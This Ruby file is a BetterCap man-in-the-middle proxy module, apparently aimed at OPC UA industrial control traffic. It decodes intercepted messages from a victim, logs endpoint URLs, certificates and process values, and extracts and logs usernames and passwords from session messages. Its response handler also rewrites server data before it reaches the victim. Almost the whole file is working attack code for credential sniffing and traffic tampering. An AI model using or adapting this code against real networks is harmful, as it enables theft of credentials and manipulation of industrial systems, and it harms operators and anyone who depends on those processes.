=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Debug < BetterCap::Proxy::TCP::Module
  meta(
    'Name'        => 'Debug',
    'Description' => 'Simple TCP debugging module.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  # Received when the victim is sending data to the upstream server.
  def on_data( event )
    # You can access the request data being sent using the event object:
    #
    #   event.data.gsub!( 'SOMETHING', 'ELSE' )
    #
    #BetterCap::StreamLogger.hexdump( event.data )
    data = event.data.dup
    unpacked = data.unpack('H*')
    msg_string = unpacked[0].slice(0,6)
    msg_type = ''
    if msg_string == "48454c"
	msg_type = "HELO" 
        endpoint_hex = unpacked[0].slice(64,128)
        endpoint_url = endpoint_hex.gsub(/../) { |pair| pair.hex.chr } 
        BetterCap::Logger.raw "Endpoint URL :" + endpoint_url
    elsif msg_string == "4f504e"
	msg_type = "OPN"
        security_policy_url = (unpacked[0].slice(32,94)).gsub(/../) { |pair| pair.hex.chr }
        senderCertificate = (unpacked[0].slice(94,102)).gsub(/../) { |pair| pair.hex.chr }
        receiverCertificate = (unpacked[0].slice(102,110)).gsub(/../) { |pair| pair.hex.chr }
        if unpacked[0].slice(126.. 141) == "ffffffffffffffff"
            senderCertificate = "None"
            receiverCertificate = "None"
        end
        BetterCap::Logger.raw "Security Policy Url:" + security_policy_url
        BetterCap::Logger.raw "Sender Certificate:" + senderCertificate
        BetterCap::Logger.raw "Receiver Certificate:" + receiverCertificate
    elsif msg_string == "4d5347"
	msg_type = "MSG"
        if unpacked[0].slice(52.. 55) == "a102"
             var_test = (unpacked[0].slice(156..unpacked[0].length)).gsub(/../) { |pair| pair.hex.chr }
   	     int_test = unpacked[0].slice((unpacked[0].length-10)..unpacked[0].length)
             gogogo = var_test.split(',')
	     if gogogo.length == 3
	         BetterCap::Logger.raw "Blue :" + gogogo[0]
		 BetterCap::Logger.raw "Green :" + gogogo[1]
		 BetterCap::Logger.raw "Red : " + gogogo[2]
	     elsif int_test.slice(0..1) == "06"
		 BetterCap::Logger.raw "Int Value:  #{((int_test.slice(2..3)).to_i(16))}"
	     end
	elsif unpacked[0].slice(52.. 55) == "d301"
	     hex_dump = (unpacked[0].slice(170..241))
             var2 = hex_dump.split("08")
	     if var2.length > 1 
                 username = (var2[0]).gsub(/../) { |pair| pair.hex.chr }
                 new = var2[1].gsub(/ff/ , '')
	         password = (new).gsub(/../) { |pair| pair.hex.chr }
	         BetterCap::Logger.raw "username :" + username.split("username")[1]
	         BetterCap::Logger.raw "password :" + password
	     end
	     
        end
    else
	msg_type = "None_of_the_Above"
    end
    #token = data.slice!(0,1).unpack('C')[0]
    #`BetterCap::StreamLogger.hexdump(token)
    BetterCap::Logger.raw "MSG TYPE : " + msg_type
    #BetterCap::Logger.raw "\n#{BetterCap::StreamLogger.hexdump( data.class )}\n"
    #BetterCap::Logger.raw "\n#{BetterCap::StreamLogger.hexdump( event.data )}\n"
  end
  # Received when the upstream server is sending a response to the victim.

  def on_response( event )
    # You can access the response data being received using the event object:
    #
    data = event.data.dup
    unpacked = data.unpack('H*')
    event.data.gsub!( '32', '61' )
    
    BetterCap::Logger.raw "\n#{BetterCap::StreamLogger.hexdump( event.data )}\n"
  end
end
